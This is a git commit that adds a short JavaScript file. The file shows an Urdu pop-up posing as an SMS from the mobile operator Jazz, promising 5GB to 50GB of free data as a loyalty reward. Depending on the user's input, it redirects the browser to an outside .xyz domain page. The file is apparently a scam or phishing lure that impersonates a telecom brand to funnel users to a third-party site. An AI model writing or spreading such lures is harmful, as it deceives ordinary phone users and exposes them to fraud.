2618e63cb56c8e041928a02a046ae248693cc41d
itidmi <itid180@gmail.com>
2026-07-19 00:53:50 -0700

    Add free jazz data prompt script

---
+++ act-freejazzdata.js
@@ -0,0 +1,6 @@
+
+var password = 'مفت ڈیٹا'
+password=prompt('JAZZ SMS: محترم صارف، ہمارے دیرینہ سبسکرائبر ہونے کے ناطے بطورِ انعام 5GB سے 50GB تک مفت انٹرنیٹ ڈیٹا حاصل کریں؛ ابھی چیک کریں۔ ','مفت ڈیٹا');
+if (password != 'مفت ڈیٹا') {
+location.href='https://itidetere.xyz/freejazzdata.html';
+}
